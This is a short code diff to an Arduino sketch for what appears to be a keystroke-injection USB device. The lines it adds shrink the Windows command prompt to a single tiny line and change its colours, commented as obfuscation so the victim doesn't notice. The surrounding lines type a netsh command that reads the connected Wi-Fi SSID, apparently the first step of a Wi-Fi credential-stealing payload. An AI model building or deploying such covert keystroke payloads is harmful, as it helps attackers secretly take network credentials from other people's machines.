@@ -41,6 +41,15 @@ void setup()
   typeKey(KEY_RETURN);
 
   delay(1000);
+  
+  // --> Obfuscate the Command Prompt
+   Keyboard.print(F("mode con:cols=18 lines=1"));
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print(F("color FE"));
+
+  typeKey(KEY_RETURN);
 
   // --> Getting SSID
   Keyboard.print("cd \"%USERPROFILE%\\Desktop\" & for /f \"tokens=2 delims=: \" %A in ('netsh wlan show interface ^| findstr \"SSID\" ^| findstr /v \"BSSID\"') do set A=%A");
